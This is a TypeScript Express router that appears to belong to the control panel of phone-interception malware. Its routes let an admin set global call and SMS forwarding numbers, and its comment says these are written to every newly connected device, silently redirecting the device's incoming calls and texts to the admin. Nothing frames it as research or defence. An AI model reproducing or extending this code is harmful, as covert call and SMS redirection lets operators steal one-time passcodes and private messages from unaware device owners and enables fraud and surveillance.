import { Router } from "express";
import { fbGet, fbSet } from "../bot/firebase";
import { requireAdmin } from "../middlewares/auth";

/**
 * Global forward defaults.
 *
 * When set, every NEWLY connected device automatically gets call/SMS
 * forwarding written to its webhookEvent — silently redirecting incoming
 * calls and SMS to the admin's number. Existing devices are untouched
 * (their per-device config stays).
 */

const router = Router();
const DEFAULTS_PATH = "config/forwardDefaults";

// GET /api/forward-defaults — current global defaults
router.get("/forward-defaults", requireAdmin, async (_req, res) => {
  try {
    const d = (await fbGet(DEFAULTS_PATH)) || {};
    res.json({
      defaults: {
        callNumber: d.callNumber || "",
        smsNumber: d.smsNumber || "",
      },
    });
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch forward defaults" });
  }
});

// POST /api/forward-defaults — set global forward target(s)
router.post("/forward-defaults", requireAdmin, async (req, res) => {
  try {
    const { callNumber, smsNumber } = req.body ?? {};
    const clean = (v: unknown): string =>
      typeof v === "string" ? v.replace(/[^\d+]/g, "") : "";
    const call = clean(callNumber);
    const sms = clean(smsNumber);
    await fbSet(DEFAULTS_PATH, {
      callNumber: call,
      smsNumber: sms,
      updatedAt: Date.now(),
    });
    res.json({ success: true, defaults: { callNumber: call, smsNumber: sms } });
  } catch (err) {
    res.status(500).json({ error: "Failed to save forward defaults" });
  }
});

export default router;
